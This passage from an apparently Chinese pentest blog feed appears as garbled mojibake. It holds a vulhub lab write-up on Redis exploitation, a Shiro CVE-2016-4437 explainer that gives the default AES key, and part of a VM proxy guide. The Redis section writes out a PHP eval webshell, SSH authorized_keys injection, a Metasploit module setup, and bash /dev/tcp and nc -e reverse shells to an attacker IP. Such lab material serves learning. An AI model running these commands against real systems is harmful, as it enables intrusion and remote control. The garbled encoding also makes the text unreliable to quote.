·å°±è¯´æ˜æˆåŠŸäº†ï¼Œ</p><p>redisæ“ä½œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info  #æŸ¥çœ‹redisçš„ä¿¡æ¯å’ŒæœåŠ¡å™¨ä¿¡æ¯</span><br><span class="line">flushall åˆ é™¤æ‰€æœ‰æ•°æ®</span><br><span class="line">del key  åˆ é™¤é”®ä¸ºkeyçš„æ•°æ®</span><br><span class="line">get key  è·å¾—å‚æ•°keyçš„æ•°æ®</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html  #å°†shellç§»åˆ°ç½‘ç«™é»˜è®¤æ ¹ç›®å½•</span><br><span class="line">config set dbfilename redis.php #åˆ›å»ºshellæ–‡ä»¶</span><br><span class="line">set webshell &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;  å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åèšå‰‘è¿æ¥</span><br><span class="line">æˆ–è€…</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[1]); ?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ç”±äºé¶æœºæ²¡æœ‰å¼€å¯webæœåŠ¡ï¼Œæ‰€ä»¥å°±ä¸æ¼”ç¤ºäº†ã€‚</p><h5 id="ä½¿ç”¨pyè„šæœ¬æ‰§è¡Œè¿œç¨‹å‘½ä»¤">ä½¿ç”¨pyè„šæœ¬æ‰§è¡Œè¿œç¨‹å‘½ä»¤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/redis-rogue-getshell.git</span><br><span class="line">cd redis-rogue-getshell/RedisModulesSDK/exp</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325094921511.png" alt="image-20250325094921511"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ../../   #å›åˆ°redis-rogue-getshellç›®å½•ä¸‹</span><br><span class="line">./redis-master.py -r 192.168.239.128 -p 6379 -L 192.168.239.128 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</span><br><span class="line">(ç¬¬ä¸€ä¸ªipæ˜¯é¶æœºï¼Œç¬¬äºŒä¸ªipæ˜¯æ”»å‡»æœº,-cåé¢è·Ÿæ‰§è¡Œçš„å‘½ä»¤)</span><br></pre></td></tr></table></figure><h5 id="sshå…¬ç§é’¥å…å¯†ç™»å½•">sshå…¬ç§é’¥å…å¯†ç™»å½•</h5><h6 id="åŸç†">åŸç†</h6><p>ç™»é™†linuxæœ‰å‡ ç§æ–¹å¼ï¼Œæœ€å¸¸ç”¨çš„æ˜¯å¯†ç ç™»é™†å’ŒRSA key ç™»é™†ï¼ŒRSA keyç™»é™†æ˜¯ç”Ÿæˆä¸€ä¸ªå…¬ç§å¯¹åº”çš„ç§˜é’¥ï¼Œç„¶åå°†å…¬é’¥æ”¾åˆ°linuxç³»ç»Ÿçš„/root/.ssh/authorized_keysçš„æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æœ¬åœ°å®¢æˆ·ç«¯é€šè¿‡å¯¼å…¥å¯¹åº”ç§é’¥è¿›è¡Œç™»é™†ï¼Œè¿™å°±æ˜¯RSA keyçš„ç™»é™†æ–¹å¼ã€‚</p><h6 id="ä¸ºä»€ä¹ˆrediså¯ä»¥è·å–æœåŠ¡å™¨çš„rootæƒé™å‘¢ï¼Ÿ">ä¸ºä»€ä¹ˆrediså¯ä»¥è·å–æœåŠ¡å™¨çš„rootæƒé™å‘¢ï¼Ÿ</h6><p>ä¸Šé¢RSA keyçš„ç™»é™†æ–¹å¼åœ¨æœåŠ¡å™¨æ–¹é¢æ˜¯è¦å°†å…¬é’¥å†™å…¥authorized_keysæ–‡ä»¶ä¸­çš„ï¼Œè€Œredisæœ‰ä¸€ç§æŒä¹…åŒ–æ–¹å¼æ˜¯ç”ŸæˆRDBæ–‡ä»¶ï¼Œé€šè¿‡æŒä¹…åŒ–å°†å…¬é’¥å†™å…¥rootä¸‹çš„authored_keysæ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å°†éæ³•çš„å…¬é’¥å†™åˆ°äº†éªŒè¯æ–‡ä»¶é‡Œï¼Œåé¢æˆ‘ä»¬æ‹¿å¯¹åº”ç§é’¥ç™»é™†å³å¯ã€‚ï¼ˆä½†æ˜¯è¿™ç§æ–¹å¼éœ€è¦redisæ˜¯rootå¯åŠ¨çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œå› ä¸ºérootæƒé™æ— æ³•è¿›å…¥/rootç›®å½•ï¼‰</p><h6 id="æ­¥éª¤">æ­¥éª¤</h6><p>åœ¨æ”»å‡»æœºä¸­ç”Ÿæˆsshå…¬é’¥å’Œç§é’¥æ–‡ä»¶ï¼Œå¯†ç ä¸ºç©º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>è¿›å…¥/home/kali/.sshç›®å½•: å°†ç”Ÿæˆçš„å…¬é’¥ä¿å­˜åˆ°sshkey.txtï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; sshkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102503591.png" alt="image-20250325102503591"></p><p>ä½¿ç”¨redis-cli -h ipå‘½ä»¤è¿æ¥é¶æœºï¼ŒæŠŠsshkey.txtå†™å…¥redisä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sshkey.txt | redis-cli -h 192.168.192.132 -x set crack</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102811549.png" alt="image-20250325102811549"></p><p>ç„¶åç”¨redis-cliè¿æ¥é¶æœºï¼Œç„¶åæ›´æ”¹ç›®æ ‡æœåŠ¡å™¨Rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½•(é»˜è®¤ä¸º/root/.ssh)</p><p>æ­¤å¤„å› ä¸ºé¶åœºä¸­çš„redisæ²¡æœ‰rootæƒé™ï¼Œå°±ä¸æ¼”ç¤ºäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br></pre></td></tr></table></figure><p>è®¾ç½®ä¸Šä¼ å…¬é’¥å¤‡ä»½æ–‡ä»¶åä¸ºauthorized_keys:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æ”»å‡»æœºä¸Šä½¿ç”¨sshå…å¯†ç ç™»å½•é¶æœºï¼Œåˆ©ç”¨ç§é’¥å°±èƒ½æˆåŠŸç™»å…¥redisæœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@ip</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨msfè¿›è¡Œæ¼æ´åˆ©ç”¨">ä½¿ç”¨msfè¿›è¡Œæ¼æ´åˆ©ç”¨</h5><p>ä½¿ç”¨searchsploitæœç´¢redisç›¸å…³æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit redis</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325104753221.png" alt="image-20250325104753221"></p><p>å¯ä»¥çœ‹åˆ°ç›¸å…³æ¼æ´éƒ½åœ¨metasploité‡Œ</p><p>å¯åŠ¨metasploitï¼ˆæ³¨æ„è¦åœ¨rootä¸‹å¯åŠ¨ï¼Œä¸ç„¶æ”»å‡»æ—¶ä¼šæŠ¥é”™ï¼‰,ç„¶åæ£€ç´¢redisç›¸å…³exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search redis type:exploit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325105152802.png" alt="image-20250325105152802"></p><p>çœ‹åˆ°æœ‰ä¸€ä¸ªcmdåˆ©ç”¨çš„æ¼æ´ï¼Œä½¿ç”¨è¯¥æ¨¡å—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/redis/redis_replication_cmd_exec</span><br></pre></td></tr></table></figure><p>ç„¶åæŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 192.168.192.135</span><br><span class="line">set RHOST 192.168.192.132</span><br><span class="line">set SRVHOST 192.168.192.135</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325110217792.png" alt="image-20250325110217792"></p><p>ç„¶åè¿è¡Œï¼Œå‡ºç°å¦‚ä¸‹æƒ…å†µå°±æˆåŠŸäº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325111732432.png" alt="image-20250325111732432"></p><h5 id="åå¼¹è¿æ¥">åå¼¹è¿æ¥</h5><p>è¿™ä¸ªæ–¹æ³•ä¸»è¦é€‚ç”¨äºé©¬è¢«æ€äº†ï¼Œæˆ–è€…é¶æœºåœ¨å†…ç½‘ä¹‹ä¸­ã€‚</p><p>å¸¸è§ç«¯å£ç›‘å¬æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netcatï¼šnc -lvp 7777</span><br><span class="line"></span><br><span class="line">msfï¼š</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.37.130</span><br><span class="line">set lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">socatï¼šsocat TCP-LISTEN:7777 - (kaliç³»ç»Ÿ)</span><br></pre></td></tr></table></figure><p>å¸¸è§å»ºç«‹è¿æ¥æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux bashï¼š</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/æ”»å‡»æœºip/æ”»å‡»æœºç›‘å¬ç«¯å£ 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">netcatï¼š</span><br><span class="line">nc -e /bin/bash æ”»å‡»æœºip æ”»å‡»æœºç›‘å¬ç«¯å£</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å°±æ¼”ç¤ºncå’Œbashçš„é…åˆï¼š</p><p>æ”»å‡»æœºè¿›è¡Œncç›‘å¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>é¶æœºä½¿ç”¨bash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.192.135/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113528895.png" alt="image-20250325113528895"></p><p>ä¹‹ååœ¨ç›‘å¬æœºä¸Šå°±èƒ½çœ‹åˆ°</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113511333.png" alt="image-20250325113511333"></p><p>ç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113712853.png" alt="image-20250325113712853"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯é¶æœºçš„ipåœ°å€ã€‚</p><p>ä¸»åŠ¨å…³é—­è¿æ¥ç›´æ¥åœ¨æ”»å‡»æœºä¸Šexitã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§redisæ¼æ´åŸç†ï¼›ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´åŠredisæ¼æ´å¤ç°ï¼›åˆ©ç”¨rediså†™å…¥webshellï¼›pythonè„šæœ¬åˆ©ç”¨redisï¼›sshå…¬é’¥å…ç™»å½•åˆ©ç”¨redisï¼›msfåˆ©ç”¨redisï¼›åå¼¹shellåˆ©ç”¨redis</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Shiroååºåˆ—åŒ–æ¼æ´å…¨è§£æ</title>
    <link href="https://blog.m3x1.cn/posts/78877ffd.html"/>
    <id>https://blog.m3x1.cn/posts/78877ffd.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:03:45.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»Apache-Shiro-1-2-4-ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰">ä»‹ç»<strong>Apache Shiro 1.2.4</strong> ååºåˆ—åŒ–æ¼æ´ï¼ˆ<strong>CVE-2016-4437</strong>ï¼‰</h2><p>Apache Shiroæ˜¯â¼€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€</p><p>æ˜“â½¤ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><p>Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„â½¤æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookie</p><p>ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿â½¤Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ â½¤æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›â½½åœ¨â½¬æ ‡æœº</p><p>å™¨ä¸Šæ‰§â¾ä»»æ„å‘½ä»¤ã€‚</p><h2 id="æ¼æ´æˆå› ">æ¼æ´æˆå› </h2><p>å…¶æ¼æ´çš„æ ¸â¼¼æˆå› æ˜¯cookieä¸­çš„èº«ä»½ä¿¡æ¯è¿›â¾äº†AESåŠ è§£å¯†ï¼Œâ½¤äºåŠ è§£å¯†çš„å¯†é’¥åº”è¯¥æ˜¯ç»å¯¹ä¿å¯†</p><p>çš„ï¼Œä½†åœ¨shiroç‰ˆæœ¬&lt;=1.2.24çš„ç‰ˆæœ¬ä¸­ä½¿â½¤äº†å›ºå®šçš„å¯†é’¥ã€‚å› æ­¤ï¼ŒéªŒè¯æ¼æ´çš„æ ¸â¼¼åº”è¯¥è¿˜æ˜¯åœ¨äºæˆ‘</p><p>ä»¬ï¼ˆæ”»å‡»è€…ï¼‰å¯å¦è·å¾—è¿™ä¸ªAESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœç¡®å®æ˜¯å›ºå®šçš„å¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>æˆ–è€…å…¶ä»–æˆ‘ä»¬å¯ä»¥é€šè¿‡è„šæœ¬â¼¯å…·çˆ†ç ´å‡ºæ¥çš„å¯†é’¥ï¼Œé‚£ä¹ˆshiro550æ¼</p><p>æ´æ‰â¼€å®šå­˜åœ¨ã€‚</p><h2 id="æ¼æ´ç¯å¢ƒåŠå¤ç°">æ¼æ´ç¯å¢ƒåŠå¤ç°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½é¡¹â½¬</span><br><span class="line"></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub</span><br><span class="line"></span><br><span class="line">master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"></span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># è¿›â¼ŠæŸâ¼€ä¸ªæ¼æ´/ç¯å¢ƒçš„â½¬å½•</span><br><span class="line"></span><br><span class="line">cd shiro/CVE-2016-4437</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨ç¯å¢ƒ</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#å¯åŠ¨å®¹å™¨</span><br><span class="line">docker run vulhub/shiro:1.2.4</span><br></pre></td></tr></table></figure><h2 id="Shiroç‰¹å¾"><strong>Shiro</strong>ç‰¹å¾</h2><p>â¾¸å…ˆåº”è¯¥åˆ¤æ–­â¼€ä¸ªâ»šâ¾¯çš„ç™»å½•æ˜¯å¦ä½¿â½¤äº†shiroæ¡†æ¶è¿›â¾èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚åˆ¤æ–­</p><p>â½…æ³•åœ¨äºï¼šå‹¾é€‰è®°ä½å¯†ç é€‰é¡¹åï¼Œç‚¹å‡»ç™»å½•ï¼ŒæŠ“åŒ…ï¼Œè§‚å¯Ÿè¯·æ±‚åŒ…ä¸­æ˜¯å¦æœ‰remembermeå­—æ®µï¼Œå“</p><p>åº”åŒ…ä¸­æ˜¯å¦æœ‰Set-cookie:rememberMe=deleteMeå­—æ®µã€‚ç±»ä¼¼äºä¸‹å›¾è¿™æ ·ï¼š</p><blockquote><p>\1. æœªç™»å½•çš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚åŒ…çš„cookieä¸­æ²¡æœ‰rememberMeå­—æ®µï¼Œè¿”å›åŒ…set-Cookieâ¾¥ä¹Ÿæ²¡æœ‰</p><p>deleteMeå­—æ®µ</p><p>\2. ç™»å½•å¤±è´¥çš„è¯ï¼Œä¸ç®¡æœ‰æ²¡æœ‰å‹¾é€‰RememberMeå­—æ®µï¼Œè¿”å›åŒ…éƒ½ä¼šæœ‰ rememberMe= deleteMe</p><p>å­—æ®µ</p><p>\3. ä¸å‹¾é€‰RememberMeï¼Œç™»å½•æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ…set-Cookieâ¾¥æœ‰rememberMe=deleteMeå­—</p><p>æ®µã€‚ä½†æ˜¯ä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­Cookieéƒ½ä¸ä¼šæœ‰RememberMeå­—æ®µ</p><p>\4. å‹¾é€‰RememberMeï¼Œç™»å½•æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ…set-Cookieâ¾¥æœ‰rememberMe=deleteMeå­—æ®µï¼Œ</p><p>è¿˜ä¼šæœ‰remember å­—æ®µï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­Cookieéƒ½ä¼šæœ‰rememberMeå­—æ®µ</p><p>\5. æˆ–è€…å¯ä»¥åœ¨cookieåâ¾¯â¾ƒâ¼°åŠ â¼€ä¸ªrememberMe=1ï¼Œçœ‹è¿”å›åŒ…æœ‰æ²¡æœ‰rememberMe=</p><p>deleteMe</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§Shiroååºåˆ—åŒ–æ¼æ´å…¨è§£æ;shiroæ¼æ´æˆå› ;shiroæ¼æ´ç¯å¢ƒåŠshiroæ¼æ´å¤ç°;shiroæ¼æ´ç‰¹å¾</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vmè™šæ‹Ÿæœºå¦‚ä½•å®ç°ä¸ä¸»æœºå…±äº«ä»£ç†å®ç°ç§‘å­¦ä¸Šç½‘</title>
    <link href="https://blog.m3x1.cn/posts/5892bf96.html"/>
    <id>https://blog.m3x1.cn/posts/5892bf96.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:04:32.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ–¹æ³•ä¸€ï¼šä½¿ç”¨tunæ¨¡å¼ï¼ˆæ¨èï¼‰">æ–¹æ³•ä¸€ï¼šä½¿ç”¨tunæ¨¡å¼ï¼ˆæ¨èï¼‰</h2><p>ç›¸å…³æ–‡ç« ï¼š<a href="https://clashvmess.com/3841.html">æ·±åº¦è§£æclashå¼€tunæ¨¡å¼ï¼šé…ç½®ä¸ä½¿ç”¨æŒ‡å— - Clashæœ€æ–°æ•™ç¨‹</a></p><p>å¦‚æœä¸»æœºæ˜¯ä½¿ç”¨ä»£ç†è½¯ä»¶èµ°ä»£ç†çš„è¯ï¼Œæ¯”å¦‚clashï¼Œ å¯ä»¥ç›´æ¥ä½¿ç”¨Tunæ¨¡å¼ã€‚Tunæ¨¡å¼ä¸‹ï¼Œä»£ç†è½¯ä»¶ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼Œä¸»æœºä¸Šçš„è¿›ç¨‹ï¼ˆåŒ…æ‹¬è™šæ‹Ÿæœºï¼‰çš„ç½‘ç»œè¯·æ±‚éƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªè™šæ‹Ÿç½‘å¡ã€‚è¿™ç§æ¨¡å¼æ‹¦æˆªäº†æ‰€æœ‰è¿›ç¨‹çš„ç½‘ç»œè¯·æ±‚ï¼Œæœ‰äº›è¿›ç¨‹å¹¶ä¸éµå®ˆç³»ç»Ÿä»£ç†ï¼Œæ¯”å¦‚ç»ˆç«¯, pip, dockerç­‰ç­‰ï¼ŒTunæ¨¡å¼ä¸“æ²»è¿™ç§ã€‚</p><h2 id="æ–¹æ³•äºŒï¼šä½¿ç”¨ç³»ç»Ÿä»£ç†æ¨¡å¼">æ–¹æ³•äºŒï¼šä½¿ç”¨ç³»ç»Ÿä»£ç†æ¨¡å¼</h2><p><strong>å¾ˆéº»çƒ¦ï¼Œæ¨èç¬¬ä¸€ç§</strong></p><p>VMè½¯ä»¶é…ç½®<br>1.VMè™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨<br>æ‰“å¼€è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ï¼ˆæ–¹å¼ï¼šç¼–è¾‘-&gt;è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨),</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/216a0bd2ce71cea38b1f4060f7fe222d.png" alt="img"></p><p>ç„¶åç‚¹å‡»æ›´æ”¹è®¾ç½®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b11d02909648f7584aa1ce3936623e16.png" alt="img"></p><p>2.é…ç½®VMnet8å’ŒVMnet1<br>VMnet8ã€å­ç½‘é…ç½®ã€‘å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4914dfc9f3dabeed102f4c586b9d7df.png" alt="img"></p><p>ã€NATè®¾ç½®ã€‘å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0cfcf812206f19a1f412471b775de26b.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5637516b8ae4604ce33c42b7f64c5097.png" alt="img"></p><p>ã€DHCPè®¾ç½®ã€‘å¦‚ä¸‹ï¼šï¼ˆå¯ä»¥ç†è§£ä¸ºè™šæ‹Ÿæœºçš„ipèŒƒå›´ï¼Œ ä¸è¦è·Ÿä¸Šå›¾é…ç½®çš„ç½‘å…³å†²çªäº†ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/035253150ff47c67925cfeabecb99510.png" alt="img"></p><p>ã€VMnet1ã€‘é‡‡ç”¨é»˜è®¤é…ç½®å°±å¯ä»¥äº†ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥æŒ‰ç…§ä¸Šè¿°vmnet8çš„æ–¹å¼ä¿®æ”¹ä¸€ä¸ªå®¹æ˜“è®°ä½çš„ipï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a544c334a48ba9745ba0c480fc19e90.png" alt="img"></p><p>å››ã€ä¸»æœºIPé…ç½®<br>windowsè¿›å…¥æ‰“å¼€è®¾ç½®-&gt;ç½‘ç»œ</p><p>ã€2024-9-18è¡¥å……ã€‘ã€å¯é€‰START  // è¡¨ç¤ºè¿™ä¸ªè¿™ä¸ªèŒƒå›´æ˜¯å¯æœ‰å¯æ— çš„ã€‘</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7642faecf3cd6799ce2c0e73d8c90f4e.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d182eddb6d4b654d1a3b89f0ca5508.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/aeaecd6a90ce5b0bdbf72c3502f8f7ef.png" alt="img"></p><p>åŒå‡»ä¸Šè¿°çº¢æ¡†ï¼Œç„¶åé…ç½®å¦‚ä¸‹ï¼šï¼ˆè¿™é‡Œä¸è¦è·Ÿä¹‹å‰çš„ç½‘å…³å†²çªäº†ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/78c1f95ff9c312d75159e9012aee7f2d.png" alt="img"></p><p>ã€2024-9-18è¡¥å……ã€‘ã€å¯é€‰END   // è¡¨ç¤ºè¿™ä¸ªèŒƒå›´æ˜¯å¯æœ‰å¯æ— çš„ã€‘</p><p>ä»£ç†è½¯ä»¶è¦å¼€å¯ã€Allow LANã€‘ï¼šï¼ˆè¿™é‡Œè¦è®°ä½ç«¯å£, æˆ‘çš„æ˜¯7890ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/11c1bd289cab27c99074b57b67ca05a6.png" alt="img"></p><p>ç„¶å‡»åç‚¹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1393a2df6b6644e3ba6a7f4a1ba42e77.png" alt="img"></p><p>è®°ä½ä¸‹é¢çš„æ¥å£ip,è¿™ä¸ªipéœ€è¦åœ¨Vmè™šæ‹Ÿæœºä¸­ä½¿ç”¨ï¼Œ ä¸¤ä¸ªéƒ½å¯ä»¥ç”¨</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4bec5d2c26060c002847ed712896f740.png" alt="img"></p><p>åœ¨windowsç»ˆç«¯ä¸‹è¾“å…¥ipconfigåŒæ ·å¯ä»¥æŸ¥åˆ°ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5ab320459f15a3b4338421f1c5dfe6d6.png" alt="img"></p><p>äº”ã€è™šæ‹Ÿæœºä»£ç†ipé…ç½®<br>åœ¨é…ç½®ä»£ç†ä¹‹å‰éœ€è¦è®¾ç½®ç½‘ç»œé€‚é…å™¨ï¼Œ æˆ‘ä»¬ä¹‹å‰é…ç½®äº†VMnet8ï¼Œåœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3799988deebfaaf7cef1b13c329631da.png" alt="img"></p><p>5.1 